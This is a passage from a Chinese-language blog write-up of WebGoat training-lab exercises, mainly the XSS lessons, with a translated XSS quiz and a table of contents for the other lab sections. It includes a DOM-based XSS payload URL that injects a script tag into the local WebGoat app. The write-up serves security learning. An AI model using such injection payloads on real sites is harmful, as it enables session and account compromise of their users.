<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var GoatAppRouter = Backbone.Router.extend(&#123;</span><br><span class="line"></span><br><span class="line">     routes: &#123;</span><br><span class="line">        &#x27;welcome&#x27;: &#x27;welcomeRoute&#x27;,</span><br><span class="line">        &#x27;lesson/:name&#x27;: &#x27;lessonRoute&#x27;,</span><br><span class="line">        &#x27;lesson/:name/:pageNum&#x27;: &#x27;lessonPageRoute&#x27;,</span><br><span class="line">        &#x27;test/:param&#x27;: &#x27;testRoute&#x27;,</span><br><span class="line">        &#x27;reportCard&#x27;: &#x27;reportCard&#x27;</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>extend</strong><code>Backbone.Router.extend(properties, [classProperties])</code> å¼€å§‹åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰çš„è·¯ç”±ç±»ã€‚å½“åŒ¹é…äº† URL ç‰‡æ®µä¾¿æ‰§è¡Œå®šä¹‰çš„åŠ¨ä½œï¼Œå¹¶å¯ä»¥é€šè¿‡ <a target="_blank" rel="noopener" href="https://wizardforcel.gitbooks.io/backbone-js-doc-112/content/6.html#Router-routes">routes</a> å®šä¹‰è·¯ç”±åŠ¨ä½œé”®å€¼å¯¹ã€‚ è¯·æ³¨æ„ï¼Œä½ è¦é¿å…åœ¨è·¯ç”±å®šä¹‰æ—¶ä½¿ç”¨å‰å¯¼æ–œæ </p>
</blockquote>
<p>æ‰€ä»¥è¿™é‡Œç­”æ¡ˆå°±æ˜¯ç›´æ¥<code>start.mvc#test</code></p>
<h3 id="11-4">11.</h3>
<p>è¿™é‡Œå°±æ˜¯åˆ©ç”¨testè¿›è¡Œxssæ”»å‡»</p>
<p>é¢˜ç›®ç»™çš„<code>webgoat.customjs.phoneHome()</code>æ˜¯ä¼šè¿”å›ä¸€ä¸ªéšæœºæ•°</p>
<p>ç›´æ¥æ„å»ºpayload</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost:8080/WebGoat/start.mvc#test/%3Cscript%3Ewebgoat.customjs.phoneHome()%3C%2fscript%3E</span><br></pre></td></tr></table></figure>
<p>åœ¨f12çš„consoleé‡Œé¢å¯ä»¥çœ‹åˆ°éšæœºæ•°ï¼Œå¡«å…¥å°±è¡Œäº†</p>
<h3 id="12-3">12</h3>
<p>ç­”æ¡ˆè¯•43124</p>
<blockquote>
<ol>
<li>
<p>å¯ä¿¡ç½‘ç«™æ˜¯å¦èƒ½æŠµå¾¡XSSæ”»å‡»ï¼Ÿ<br>
è§£å†³æ–¹æ¡ˆ 1ï¼šæ˜¯çš„ï¼Œå®ƒä»¬æ˜¯å®‰å…¨çš„ï¼Œå› ä¸ºæµè§ˆå™¨åœ¨æ‰§è¡Œä¹‹å‰ä¼šæ£€æŸ¥ä»£ç ã€‚<br>
è§£å†³æ–¹æ¡ˆ 2ï¼šæ˜¯çš„ï¼Œå› ä¸º Google æœ‰ä¸€ç§é˜»æ­¢æ¶æ„ä»£ç çš„ç®—æ³•ã€‚<br>
è§£å†³æ–¹æ¡ˆ3ï¼šå¦ï¼Œå› ä¸ºæ‰§è¡Œçš„è„šæœ¬ä¼šçªç ´æµè§ˆå™¨çš„é˜²å¾¡ç®—æ³•ã€‚<br>
è§£å†³æ–¹æ¡ˆ 4ï¼šå¦ï¼Œå› ä¸ºæµè§ˆå™¨ä¿¡ä»»è¯¥ç½‘ç«™ï¼Œå¦‚æœå®ƒè¢«ç¡®è®¤ä¸ºå—ä¿¡ä»»ï¼Œåˆ™æµè§ˆå™¨ä¸çŸ¥é“è¯¥è„šæœ¬æ˜¯æ¶æ„çš„ã€‚</p>
</li>
<li>
<p>XSSæ”»å‡»ä½•æ—¶å‘ç”Ÿï¼Ÿ<br>
è§£å†³æ–¹æ¡ˆ 1ï¼šæ•°æ®é€šè¿‡å—ä¿¡ä»»çš„æºè¿›å…¥ Web åº”ç”¨ç¨‹åºã€‚<br>
è§£å†³æ–¹æ¡ˆ 2ï¼šæ•°æ®é€šè¿‡ç½‘ç«™è¿›å…¥æµè§ˆå™¨åº”ç”¨ç¨‹åºã€‚<br>
è§£å†³æ–¹æ¡ˆ 3ï¼šæ•°æ®åŒ…å«åœ¨å‘é€ç»™ Web ç”¨æˆ·çš„åŠ¨æ€å†…å®¹ä¸­ï¼Œè€ŒæœªéªŒè¯æ¶æ„å†…å®¹ã€‚<br>
è§£å†³æ–¹æ¡ˆ 4ï¼šæ•°æ®åœ¨é™æ€å†…å®¹ä¸­è¢«æ’é™¤åœ¨å¤–ï¼Œå³åœ¨æœªç»éªŒè¯çš„æƒ…å†µä¸‹å‘é€æ•°æ®ã€‚</p>
</li>
<li>
<p>ä»€ä¹ˆæ˜¯å­˜å‚¨å‹XSSæ”»å‡»ï¼Ÿ<br>
è§£å†³æ–¹æ¡ˆ 1ï¼šè„šæœ¬æ°¸ä¹…å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸Šï¼Œå—å®³è€…åœ¨å‘æœåŠ¡å™¨è¯·æ±‚ä¿¡æ¯æ—¶è·å–æ¶æ„è„šæœ¬ã€‚<br>
è§£å†³æ–¹æ¡ˆ 2ï¼šè¯¥è„šæœ¬å°†è‡ªèº«å­˜å‚¨åœ¨å—å®³è€…çš„è®¡ç®—æœºä¸Šï¼Œå¹¶åœ¨æœ¬åœ°æ‰§è¡Œæ¶æ„ä»£ç ã€‚<br>
è§£å†³æ–¹æ¡ˆ 3ï¼šè¯¥è„šæœ¬å°†ç—…æ¯’å­˜å‚¨åœ¨å—å®³è€…çš„è®¡ç®—æœºä¸Šã€‚æ”»å‡»è€…ç°åœ¨å¯ä»¥æ‰§è¡Œå„ç§æ“ä½œã€‚<br>
è§£å†³æ–¹æ¡ˆ 4ï¼šè„šæœ¬å­˜å‚¨åœ¨æµè§ˆå™¨ä¸­ï¼Œå¹¶å‘æ”»å‡»è€…å‘é€ä¿¡æ¯ã€‚</p>
</li>
<li>
<p>ä»€ä¹ˆæ˜¯åå°„å¼ XSS æ”»å‡»ï¼Ÿ<br>
è§£å†³æ–¹æ¡ˆ 1ï¼šåå°„æ”»å‡»å°†æ¶æ„ä»£ç ä»æ•°æ®åº“åå°„åˆ° Web æœåŠ¡å™¨ï¼Œç„¶åå°†å…¶åå°„å›ç”¨æˆ·ã€‚<br>
è§£å†³æ–¹æ¡ˆ 2ï¼šå®ƒä»¬å°†æ³¨å…¥çš„è„šæœ¬åæ˜ åœ¨ Web æœåŠ¡å™¨ä¹‹å¤–ã€‚å½“å‘é€åˆ° Web æœåŠ¡å™¨çš„è¾“å…¥æ˜¯è¯·æ±‚çš„ä¸€éƒ¨åˆ†æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µã€‚<br>
è§£å†³æ–¹æ¡ˆ 3ï¼šåå°„å¼æ”»å‡»ä»é˜²ç«å¢™åå°„åˆ°ç”¨æˆ·ä»ä¸­è¯·æ±‚ä¿¡æ¯çš„æ•°æ®åº“ã€‚<br>
è§£å†³æ–¹æ¡ˆ 4ï¼šåå°„å‹ XSS æ˜¯ä¸€ç§æ”»å‡»ï¼Œå…¶ä¸­æ³¨å…¥çš„è„šæœ¬ä»æ•°æ®åº“å’Œ Web æœåŠ¡å™¨åå°„åˆ°ç”¨æˆ·ã€‚</p>
</li>
<li>
<p>JavaScript æ˜¯æ‰§è¡Œ XSS æ”»å‡»çš„å”¯ä¸€æ–¹æ³•å—ï¼Ÿ<br>
è§£å†³æ–¹æ¡ˆ 1ï¼šæ˜¯çš„ï¼Œæ‚¨åªèƒ½é€šè¿‡ JavaScript ä½¿ç”¨æ ‡ç­¾ã€‚<br>
è§£å†³æ–¹æ¡ˆ 2ï¼šæ˜¯çš„ï¼Œå¦åˆ™æ‚¨æ— æ³•çªƒå– cookieã€‚<br>
è§£å†³æ–¹æ¡ˆ 3ï¼šä¸ï¼Œä¹Ÿæœ‰ ECMAScriptã€‚<br>
è§£å†³æ–¹æ¡ˆ4ï¼šä¸ï¼Œè¿˜æœ‰å¾ˆå¤šå…¶ä»–æ–¹æ³•ã€‚å¦‚ HTMLã€Flash æˆ–æµè§ˆå™¨æ‰§è¡Œçš„ä»»ä½•å…¶ä»–ç±»å‹çš„ä»£ç ã€‚</p>
</li>
</ol>
</blockquote>
<h2 id="9-Insecure-Deserialization">9.Insecure Deserialization</h2>
<h2 id="10-Vulnerable-Components">10.Vulnerable Components</h2>
<h2 id="11-Request-Forgeries">11.Request Forgeries</h2>
<h2 id="12-Client-side">12.Client side</h2>
<h2 id="13-Challenges">13.Challenges</h2>
</article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>CTFä¹‹WebGoatå­¦ä¹ è®°å½•</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://nonevector.top/posts/19.html">https://nonevector.top/posts/19.html</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>ä½œè€…</h><div class="post-copyright-cc-info"><h>NoneVector</h></div></div><div class="post-copyright-c"><h>å‘å¸ƒäº</h><div class="post-copyright-cc-info"><h>2023-12-10</h></div></div><div class="post-copyright-u"><h>æ›´æ–°äº</h><div class="post-copyright-cc-info"><h>2024-01-07</h></div></div><div class="post-copyright-c"><h>è®¸å¯åè®®</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WebGoat/"><div class="tags-punctuation"><svg class="faa-tada icon" style="height:1.1em;width:1.1em;fill:currentColor;position:relative;top:2px;margin-right:3px" aria-hidden="true"><use xlink:href="#icon-sekuaibiaoqian"></use></svg></div>WebGoat</a></div></div><link rel="stylesheet" href="/css/coin.css" media="defer" onload="this.media='all'"/><div class="post-reward"><button class="tip-button reward-button"><span class="tip-button__text">æŠ•å–‚ä½œè€…</span><div class="coin-wrapper"><div class="coin"><div class="coin__middle"></div><div class="coin__back"></div><div class="coin__front"></div></div></div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://nonevector.top/assets/ganyu_happy.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://nonevector.top/assets/ganyu_happy.jpg" alt="å¾®ä¿¡"/></a><div class="post-qr-code-desc">å¾®ä¿¡</div></li><li class="reward-item"><a href="https://nonevector.top/assets/kelee.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://nonevector.top/assets/kelee.png" alt="æ”¯ä»˜å®"/></a><div class="post-qr-code-desc">æ”¯ä»˜å®</div></li></ul></div></button></div><audio id="coinAudio" src="https://npm.elemecdn.com/akilar-candyassets@1.0.36/audio/aowu.m4a"></audio><script defer="defer" src="/js/coin.js"></script><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/18.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/anmi/Pixiv/55019698_p0.jpg" onerror="onerror=null;src='/assets/r2.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">ä¸‹ä¸€ç¯‡</div><div class="next_info">dirsearch</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> è¯„è®º</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><svg class="meta_icon" style="width:22px;height:22px;position:relative;top:5px"><use xlink:href="#icon-mulu1"></use></svg><span style="font-weight:bold">ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-text">å®‰è£…+ç¯å¢ƒé…ç½®</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E5%B7%A5%E5%85%B7"><span class="toc-text">å¸¸ç”¨å‘½ä»¤å’Œå·¥å…·</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-%E7%BF%BB%E8%AF%91%E8%BD%AF%E4%BB%B6"><span class="toc-text">0.ç¿»è¯‘è½¯ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-curl"><span class="toc-text">1.curl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-burp"><span class="toc-text">2.burp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-F12"><span class="toc-text">3.F12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-dirsearch"><span class="toc-text">4.dirsearch</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-GitHack"><span class="toc-text">5.GitHack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-dvcs-ripper"><span class="toc-text">6.dvcs-ripper</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-password"><span class="toc-text">7.password</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E7%BC%96%E7%A0%81-%E8%A7%A3%E7%A0%81%E5%B7%A5%E5%85%B7"><span class="toc-text">8.ç¼–ç &#x2F;è§£ç å·¥å…·</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Introduction"><span class="toc-text">1.Introduction</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-WebGoat"><span class="toc-text">1.WebGoat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-WebWolf"><span class="toc-text">2.WebWolf</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Introducing-WebWolf"><span class="toc-text">1.Introducing WebWolf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Uploading-files"><span class="toc-text">2.Uploading files</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Your-own-mailbox"><span class="toc-text">3.Your own mailbox</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-Landing-page"><span class="toc-text">4.Landing page</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-General"><span class="toc-text">2.General</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-HTTP-Basics"><span class="toc-text">1.HTTP Basics</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2"><span class="toc-text">2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3"><span class="toc-text">3</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-HTTP-Proxies"><span class="toc-text">2.HTTP Proxies</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#6"><span class="toc-text">6</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Developer-Tools"><span class="toc-text">3.Developer Tools</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4"><span class="toc-text">4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2"><span class="toc-text">6</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-CIA-Triad"><span class="toc-text">4.CIA Triad</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5"><span class="toc-text">5</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Crypto-Basics"><span class="toc-text">5.Crypto Basics</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Base64-Encoding"><span class="toc-text">2.Base64 Encoding</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Other-Encoding"><span class="toc-text">3.Other Encoding</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-Hashing"><span class="toc-text">4.Hashing</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-2"><span class="toc-text">5.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8"><span class="toc-text">8.</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-Writing-new-lesson"><span class="toc-text">6.Writing new lesson</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Injection"><span class="toc-text">3.Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-SQL-Injection-intro-%EF%BC%88SQL%E6%B3%A8%E5%85%A5-%E7%AE%80%E5%8D%95%E7%89%88%EF%BC%89"><span class="toc-text">1.SQL Injection(intro)ï¼ˆSQLæ³¨å…¥-ç®€å•ç‰ˆï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2"><span class="toc-text">2.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2"><span class="toc-text">3.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2"><span class="toc-text">4.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-3"><span class="toc-text">5.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9"><span class="toc-text">9.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10"><span class="toc-text">10.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11"><span class="toc-text">11.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#12"><span class="toc-text">12.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#13"><span class="toc-text">13.</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-SQL-injection-advanced-%EF%BC%88SQL%E6%B3%A8%E5%85%A5-%E9%AB%98%E7%BA%A7%E7%89%88%EF%BC%89"><span class="toc-text">2.SQL injection(advanced)ï¼ˆSQLæ³¨å…¥-é«˜çº§ç‰ˆï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3"><span class="toc-text">3.</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E5%86%99%E6%B3%95"><span class="toc-text">ç¬¬ä¸€ç§å†™æ³•</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E5%86%99%E6%B3%95"><span class="toc-text">ç¬¬äºŒç§å†™æ³•</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-4"><span class="toc-text">5.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-3"><span class="toc-text">6.</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1"><span class="toc-text">1.</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3"><span class="toc-text">2.</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-4"><span class="toc-text">3.</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-3"><span class="toc-text">4.</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-5"><span class="toc-text">5.</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-SQL-Injection-mitigation-%EF%BC%88SQL%E6%B3%A8%E5%85%A5%E7%BC%93%E8%A7%A3%EF%BC%89"><span class="toc-text">3.SQL Injection(mitigation)ï¼ˆSQLæ³¨å…¥ç¼“è§£ï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4"><span class="toc-text">1-4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-6"><span class="toc-text">5.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-4"><span class="toc-text">6.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7"><span class="toc-text">7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-2"><span class="toc-text">9.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10-2"><span class="toc-text">10.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#12-2"><span class="toc-text">12.</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Path-traversal-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86"><span class="toc-text">4.Path traversal(è·¯å¾„éå†)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2"><span class="toc-text">1.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4"><span class="toc-text">2.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-5"><span class="toc-text">3.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4"><span class="toc-text">4.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-7"><span class="toc-text">5.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-2"><span class="toc-text">7.</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Broken-Authentication%EF%BC%88%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">4.Broken Authenticationï¼ˆèº«ä»½éªŒè¯ç»•è¿‡ï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Authentication-Bypass%EF%BC%88%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">1.Authentication Bypassï¼ˆèº«ä»½éªŒè¯ç»•è¿‡ï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3"><span class="toc-text">1.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-5"><span class="toc-text">2.</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-JWT-tokens"><span class="toc-text">2.JWT tokens</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Json-Web-Token"><span class="toc-text">1.Json Web Token</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFJWT"><span class="toc-text">ä»€ä¹ˆæ˜¯JWT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#JWT-%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-text">JWT çš„åŸç†</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#JWT-%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="toc-text">JWT çš„æ•°æ®ç»“æ„</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Header"><span class="toc-text">Header</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Payload"><span class="toc-text">Payload</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Signature"><span class="toc-text">Signature</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-8"><span class="toc-text">5.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-5"><span class="toc-text">6.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-3"><span class="toc-text">7.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-2"><span class="toc-text">8.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10-3"><span class="toc-text">10.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11-2"><span class="toc-text">11.</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Password-reset%EF%BC%88%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%EF%BC%89"><span class="toc-text">3.Password resetï¼ˆå¯†ç é‡ç½®ï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-6"><span class="toc-text">2.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-5"><span class="toc-text">4.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-9"><span class="toc-text">5.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-6"><span class="toc-text">6.</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Secure-Passwords%EF%BC%88%E5%AF%86%E7%A0%81%E5%AE%89%E5%85%A8%EF%BC%89"><span class="toc-text">4.Secure Passwordsï¼ˆå¯†ç å®‰å…¨ï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-6"><span class="toc-text">4.</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-Sensitive-Data-Exposure%EF%BC%88%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E6%9A%B4%E9%9C%B2%EF%BC%89"><span class="toc-text">5.Sensitive Data Exposureï¼ˆæ•æ„Ÿæ•°æ®æš´éœ²ï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Insecure-Login%EF%BC%88%E4%B8%8D%E5%AE%89%E5%85%A8%E7%99%BB%E5%BD%95%EF%BC%89"><span class="toc-text">1.Insecure Loginï¼ˆä¸å®‰å…¨ç™»å½•ï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-7"><span class="toc-text">2.</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-XML-External-Entities%EF%BC%88XXE%EF%BC%89%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%EF%BC%89"><span class="toc-text">6.XML External Entitiesï¼ˆXXEï¼‰ï¼ˆXMLå¤–éƒ¨å®ä½“ï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-text">0 åŸºæœ¬æ¦‚å¿µ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0-XML%E5%9F%BA%E7%A1%80"><span class="toc-text">0.XMLåŸºç¡€</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-XML%E6%A0%87%E7%AD%BE"><span class="toc-text">1.XMLæ ‡ç­¾</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%AF%8F%E4%B8%AA%E6%9E%84%E5%BB%BA%E6%A8%A1%E5%9D%97%E7%9A%84%E7%AE%80%E8%A6%81%E6%8F%8F%E8%BF%B0"><span class="toc-text">1.æ¯ä¸ªæ„å»ºæ¨¡å—çš„ç®€è¦æè¿°</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-%E5%85%83%E7%B4%A0"><span class="toc-text">1. å…ƒç´ </span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-%E5%B1%9E%E6%80%A7"><span class="toc-text">2. å±æ€§</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-%E5%AE%9E%E4%BD%93"><span class="toc-text">3. å®ä½“</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#4-PCDATA"><span class="toc-text">4. PCDATA</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#5-CDATA"><span class="toc-text">5. CDATA</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-XML%E8%AF%AD%E6%B3%95%E8%A7%84%E5%88%99"><span class="toc-text">2.XMLè¯­æ³•è§„åˆ™</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-DTD"><span class="toc-text">2.DTD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%AE%9E%E4%BD%93-2"><span class="toc-text">3.å®ä½“</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5"><span class="toc-text">4.XMLå¤–éƒ¨å®ä½“æ³¨å…¥</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3"><span class="toc-text">1-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-7"><span class="toc-text">4.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-6"><span class="toc-text">5-6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-4"><span class="toc-text">7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-3"><span class="toc-text">8.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-3"><span class="toc-text">9.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-4"><span class="toc-text">10.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-3"><span 